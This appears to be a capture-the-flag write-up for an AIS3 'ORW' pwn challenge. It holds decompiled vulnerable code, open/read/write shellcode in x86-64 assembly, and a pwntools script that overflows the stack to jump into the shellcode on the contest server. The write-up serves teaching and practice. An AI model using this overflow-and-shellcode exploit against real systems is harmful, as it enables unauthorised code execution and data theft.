### ORW
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  puts("Give me your shellcode>");
  read(0, &unk_6010A0, 0x100uLL);
  puts("I give you bof, you know what to do :)");
  gets(&v4, &unk_6010A0);
  return 0LL;
}
```
- open read write 在/home/orw/底下的flag檔案 然後用最後給的bof蓋掉ret adr到我們寫的shellcode arr上面
- 構造ASM
    - file = open('/home/orw///flag', 0, 0)
    ```
    mov rax, 0x2
	push 0x0
	mov rbx, 0x67616c662f2f2f77
	push rbx
	mov rbx, 0x726f2f656d6f682f
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall
    ```
    - read(file, shellcode-0x100, 40)
    ```
    mov rdi, rax
	mov rax, 0x0
	mov rsi, 0x006010A0
	add rsi, 0x100
	mov rdx, 0x40
	syscall
    ```
    - write(stdout, shellcode-0x100, 40)
    ```
    mov rax, 0x1
	mov rdi, 0x1
	mov rsi, 0x006010A0
	add rsi, 0x100
	mov rdx, 0x40
	syscall
    ```
- payload:
```
from pwn import *
conn = remote("pre-exam-pwn.ais3.org", "10001")
context.arch = 'amd64'
payload = asm(ASM)
conn.recvuntil('>')
conn.sendline(payload)
conn.recvuntil(":)\n")
payload = b"A" * 32 + p64(0x6010A0)
conn.sendline(payload)
conn.interactive()
```